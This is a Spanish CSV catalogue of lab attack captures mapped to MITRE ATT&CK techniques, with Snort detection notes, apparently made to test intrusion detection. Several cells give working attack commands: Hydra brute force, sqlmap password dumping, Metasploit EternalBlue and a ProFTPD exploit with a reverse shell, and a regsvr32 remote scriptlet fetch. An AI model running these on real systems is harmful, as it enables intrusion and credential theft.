TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Command and Control,-,TA0040,Ingress Tool Transfer,T1105,-,-,Transferencia de archivos de un servidor C2 a un equipo previamente comprometido,"Metasploit, FTP",T1105-Ingress_Tool_Transfer_[5].pcapng,FTP,7,1,0,1,1,1,0,-,SI,"Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.","Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima",Manual [5] / 4.8.1,Manual [5] / C.2,Manual [5] / 5.11.7,1,1,0,1,0,1,LV1,La transferencia de herramientas de ingreso siempre es un ataque,L3,1,1
Credential Access,-,TA0006,Brute Force,T1110,Password Spraying,T1110.003,Ataque de fuerza bruta basado en diccionario de contraseñas,wifite,T1110-Diccionario_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.7,Manual [1] / E.26,Manual [4] / 4.2.31,1,0,0,1,1,1,LV1,El uso de fuerza bruta mediante diccionario siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Cracking,T1110.002,Ataque PMKID,"hashcat, hcxpcapngtool, hcxdumptool",T1110-pmkid_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.6.3,Manual [1] / E.25,Manual [4] / 4.2.32,1,0,0,1,1,1,LV1,Un ataque PMKID siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Cracking,T1110.002,PTW/KoreK/FMS,Suite aircrack-ng,T1110-Ptw_korek_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.5,Manual [1] / E.24,Manual [4] / 4.1.33,1,0,0,1,1,1,LV1,Un ataque de fuerza bruta siempre es un ataque,L2 (WEP),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Ataque sobre WPS,"wash, reaver",T1110-Wps_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.8,Manual [1] / E.27,Manual [4] / 4.1.34,1,0,0,1,0,1,LV1,Un ataque de fuerza bruta siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),FTP - Patator,T1110.001-FTP-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un elevado número de intentos de acceso al servicio FTP de la víctima,-,Dataset CIC-2018,Manual [4] / B.32,Dataset CIC-2018,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via FTP a la víctima siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),Hydra,T1110.001-Hydra_[3].pcapng,SSH,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta",Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando: hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh,Manual [3] / 3.8.9,Manual [3] / 3.8.9.4,Manual [3] / 3.8.9.5,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),SSH - Patator,T1110.001-SSH-C2018_[6].pcapng,SSH,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta",-,Dataset CIC-2018,Manual [4] / B.33,Dataset CIC-2018,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque,L3,0,1
Defense Evasion,-,TA0005,Modify Registry,T1112,-,-,Modificación del Registro de forma remota,reg (Remoto),T1112-Modify_registry_[4].pcapng,WINREG,15,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service,-,Manual [4] / 3.9,Manual [4] / B.9,Manual [4] / 4.9,1,1,0,1,0,1,LV2,La modificación del registro de forma remota en ciertos contextos puede tratarse de actividad legítima,L3,0,1
Collection,-,TA0009,Email Collection,T1114,Remote Email Collection,T1114.002,Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas,PowerShell,T1114-Email_collection_remote_email_collection_[4].pcapng,HTTP,10,3,0,3,3,3,0,-,SI,Regla genérica que detecte el intento de extracción de información relacionada con los correos electrónicos de una empresa alojados en un servidor Microsoft Exchange,-,Manual [4] / 3.16,Manual [4] / B.16,Manual [4] / 4.16,1,1,0,1,0,1,LV2,La recolección de correos electrónicos de un servidor Microsoft Exchange puede tratarse de una acción legítima en algunos contextos,L3,1,1
Command and Control,-,TA0040,Data Encoding,T1132,Standard Encoding,T1132.001,Codificacion de mensajes entre la victima y el C2 Server mediante Base64,"Metasploit, curl, base64",T1132.001-Standard_Encoding_[5].pcapng,HTTP,10,5,1,5,5,5,0,-,NO,Deteccion por anomalias,Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64,Manual [5] / 4.8.2,Manual [5] / C.3,Manual [5] / 5.11.8,1,1,0,1,0,1,LV1,La codificación en base 64 de un canal c2 siempre es un ataque,L3,1,0
Initial Access,Persistence,TA0001,External Remote Services,T1133,-,-,Acceso a red VPN desde dispositivo no autorizado con credenciales robadas,OpenVPN,T1133-External_remote_services_[4].pcapng,-,32,1,0,1,1,1,0,-,NO***,"Existen varias variantes.
 Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
 Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).
","Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso",Manual [4] / 3.3,Manual [4] / B.3,Manual [4] / 4.3,1,1,0,1,0,1,LV2,El acceso a una red VPN es una acción legítima en algunos contextos,L3,0,0
Persistence,-,TA0003,Browser Extensions,T1176,-,-,Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor,Malicious-browser-extension,T1176-Browser-extension_[4].pcapng,HTTP,217,212,0,212,212,212,0,-,NO,"Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript",-,Manual [4] / 3.7,Manual [4] / B.7,Manual [4] / 4.7,1,1,0,1,0,1,LV1,El uso de una extensión maliciosa que publica información confidencial siempre es un ataque,L3,0,0
Credential Access,-,TA0006,Forced Authentication,T1187,-,-,Forzar intento de autenticación en un servidor para obtener credenciales de acceso,"SMB, NTLMssp-Extract",T1187-Forced_Authentication_[5].pcapng,SMB2,8,1,0,1,3,3,0,-,SI,"Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV",Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas,Manual [5] / 4.5.1,Manual [5] / C.4,Manual [5] / 5.7.4,1,1,0,1,0,1,LV1,Forzar un intento de autenticación siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Forced Authentication,T1187,-,-,Forzar intento de autenticación en un servidor para obtener credenciales de acceso,"SMB, NTLMssp-Extract",T1187-Forced_Authentication2_[5].pcapng,SMB2,3,1,0,1,3,3,0,-,SI,"Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV",Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas,Manual [5] / 4.5.1,Manual [5] / C.4,Manual [5] / 5.7.4,1,1,0,1,0,1,LV1,Forzar un intento de autenticación siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Drive-by Compromise,T1189,-,-,HTML Exploit I - HTML Compilador,"Apache, Shadyantra",T1189-Drive-by_compromise_v1_[4].pcapng,HTTP,4,3,0,3,3,3,0,-,SI,Regla que detecte el aprovechamiento de una vulnerabilidad del navegador Mozilla Firefox para llevar a cabo una compilación de código en la víctima,Carga de página web con exploit HTML para compilar código malware (no ejecutar),Manual [4] / 3.4,Manual [4] / B.4,Manual [4] / 4.4,1,1,0,1,0,1,LV1,El uso de un exploit para compilar código en la víctima siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Drive-by Compromise,T1189,-,-,HTML Exploit II - Descarga de Ejecutable,"Apache, Shadyantra",T1189-Drive-by_compromise_v2_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte la descarga no autorizada de un archivo .exe (ejecutable) en el equipo víctima desde una página web posiblemente fraudulenta,Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe,Manual [4] / 3.4,Manual [4] / B.4,Manual [4] / 4.4,1,1,0,1,0,1,LV2,La descarga no autorizada de un ejecutable no siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Damn Vulnerable Web App (DVWA),T1190-Sql_injection-C2018_[6].pcapng,HTTP,50,35,0,38,38,38,0,-,SI,Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML,-,Dataset CIC-2018,Manual [4] / B.34,Dataset CIC-2018,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Sqlmap,T1190-Sql_inyection1_[3].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.,Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords,Manual [3] / 3.8.5,Manual [3] / 3.8.5.4,Manual [3] / 3.8.5.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,"curl, DVWA",T1190-SQL_Injection_High_Bytes1_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento de inyección SQL en la URL de una petición,Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno,Manual [4] / 3.26,Manual [4] / B.39,Manual [4] / 4,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,"curl, DVWA",T1190-SQL_Injection_High_Bytes2_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento de inyección SQL en la URL de una petición,Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno,Manual [4] / 3.26,Manual [4] / B.39,Manual [4] / 4,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Sqlmap,T1190-Sql_inyection2_[2].pcapng,HTTP,77,76,0,76,76,76,0,-,SI,Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.,Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords,Manual [2] / 3.1.3.1,Manual [4] / B.28,Manual [2] / 4.1.1.2,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Persistence,Defense Evasion,TA0003,BITS Jobs,T1197,-,-,Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo,"BITSADMIN,METASPLOIT",T1197-BITS_Jobs_[5].pcapng,TCP,27,9,2,16,18,16,2,Descarga de Malware previa - T1105,SI,"Regla genérica que detecte la presencia de cadenas en el contenido de los paquetes como ""Microsoft BITS"" y "".exe"", alertando del intento de creación de una tarea BITS",Ejecución de comandos para la creación de una tarea BITS con rastro de red,Manual [5] / 4.3.1,Manual [5] / C.5,Manual [5] / 5.5.2,1,1,0,1,0,1,LV2,El establecimiento de tareas BITS puede considerarse como tráfico legítimo o como ataque,L3,1,1
Initial Access,-,TA0001,Trusted Relationship,T1199,-,-,Uso de una conexión RDP sin proteger para el acceso a un equipo,RDP,T1199-Trusted_relationship_[4].pcapng,RDP,18,3,0,2,2,2,0,-,SI*,"El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza",-,Manual [4] / 3.5,Manual [4] / B.5,Manual [4] / 4.5,1,1,0,1,0,1,LV2,"El uso de una conexión RDP para ganar acceso a un equipo no siempre constituye un ataque, depende del contexto",L3,0,1
Initial Access,-,TA0001,Hardware Additions,T1200,-,-,Adición de Hardware,SSH Server + USB(Simular USB con MV con SO),T1200-Hardware_Additions_[5].pcapng,SSH,3,1,0,1,1,1,0,-,NO,"Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales","Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.",Manual [5] / 4.2.1,Manual [5] / C.6,Manual [5] / 5.3.4,1,1,0,1,0,1,LV1,Añadir un equipo hardware a una red siempre es un ataque,L3,0,0
Execution,-,TA0002,Exploitation for Client Execution,T1203,-,-,Ataque con Botnet,"Ares, Screenshot and key logging",T1203-C2018_[6].pcapng,-,116,112,0,11053,11053,11053,0,-,NO,-,-,Dataset CIC-2018,Dataset CIC-2018,Manual [4] / B.35,1,1,0,1,0,1,LV1,Un ataque con botnet siempre es un ataque,L3,0,1
Execution,-,TA0002,User Execution,T1204,Malicious Link,T1204.001,Enlace malicioso,wget,T1204.001-malicious_link_[3].pcapng,TCP,1,1,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima),Manual [3] / 3.8.17,Manual [3] / 3.8.17.4,Manual [3] / 3.8.17.5,1,1,0,1,0,1,LV2,Un enlace malicioso a veces puede ser considerado como tráfico legítimo dependiendo de las circuntstancias,L3,0,0
Command and Control,"Defense Evasion, Persistence",TA0040,Traffic Signaling,T1205,Port Knocking,T1205.001,Esconder y activar un puerto de forma remota,Knockd,T1205.001-Port_Knocking_[3].pcapng,TCP,5,1,0,1,1,1,0,-,NO,Detección por anomalías en base a una actividad sospechosa en un puerto concreto,"Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000",Manual [3] / 3.8.11,Manual [3] / 3.8.11.4,Manual [3] / 3.8.11.5,1,1,0,1,0,1,LV1,El Port Knocking siempre se considera un ataque,L3,0,0
Defense Evasion,-,TA0005,Rogue Domain Controller,T1207,-,-,DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory,mimikazt,T1207-Rogue_domain_controller_[4].pcapng,DCERPC,88,1,0,1,1,1,0,-,SI,"Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5), o un intento de aprovechamiento de una vulnerabilidad de la misma",-,Manual [4] / 3.10,Manual [4] / B.10,Manual [4] / 4.10,1,1,0,1,0,1,LV1,El registro de un DC fraudulento para habilitar la manipulación de datos siempre es un ataque (aunque las tareas realizadas posteriormente puedan realizarse también en un entorno legítimo),L3,0,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,EternalBlue,Metasploit,T1210-Eternal_blue_[2].pcapng,SMB,24,2,0,2,2,2,0,-,SI,Regla genérica que detecte uso de EternalBlue,"Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x ""use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit""",Manual [2] / 3.1.7.1,Manual [4] / B.29,Manual [2] / 4.1.1.4,1,1,0,1,0,1,LV1,El aprovechamiento de vulnerabilidades en el servicio SMB para realizar diferentes tareas maliciosas siempre constituye un ataque,L3,1,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,Ejecución de código remoto basado en vulnerabilidades de servidor FTP,Metasploit,T1210-Remote_code_execution_[2].pcapng,FTP,3,1,0,4,4,4,0,-,SI,Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP,"Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x ""use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit""",Manual [2] / 3.1.7.2,Manual [4] / B.30,Manual [2] / 4.2.1.9,1,1,0,1,0,1,LV1,La ejecución de código remoto aprovechando vulnerabilidades en el servidor FTP siempre es un ataque,L3,0,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,Ataque Web,"DVWA, In-house selenium framework",T1210-Web_attack-C2018_[6].pcapng,HTTP,260,236,0,1,1,1,0,-,NO,-,-,Dataset CIC-2018,Manual [4] / B.36,Dataset CIC-2018,1,1,0,1,0,1,LV1,Un ataque web siempre es considerado como tal,L3,0,0
Collection,-,TA0009,Data from Information Repositories,T1213,-,-,Inyección SQL,Sqlmap,T1213-SQL_inyection_[3].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte una inyección SQL en la URL de acceso a una página web,Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla,Manual [3] / 3.8.6,Manual [3] / 3.8.6.4,Manual [3] / 3.8.6.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Defense Evasion,-,TA0005,System Binary Proxy Execution,T1218,Regsvr32,T1218.010,Ejecución de COM scriptlet remoto,Regsvr32.exe,T1218.010-COM_Scriptlet_[2].pcapng,TLS,2,1,0,1,1,1,0,-,SI,Regla genérica que detecte un intento de aprovechamiento de la vulnerabilidad del servicio regsvr32 de Windows,Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll,Manual [2] / 3.3.1.1,Manual [5] / C.25,-,1,1,0,1,0,1,LV1,La ejecucion de un scriptlet remoto siempre se considera como un ataque,L3,0,1
Command and Control,-,TA0040,Remote Access Software,T1219,-,-,Uso de TeamViewer para establecer canal de comunicación alternativo,TeamViewer,T1219-RemoteAccessSoftwareLocal_[5].pcapng,UDP,2,1,0,1,1,1,0,-,SI,"Monitorizar tráfico de red correspondiente a softwares de acesso remoto(AnyDesk, TeamViewer...). En su defecto, Deteccion por listas negras/anomalías.",Conexion mediante TeamViewer entre dos equipos,Manual [5] / 4.8.3,Manual [5] / C.7,Manual [5] / 5.11.9,1,1,0,1,0,1,LV2,"Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo",L3,0,1
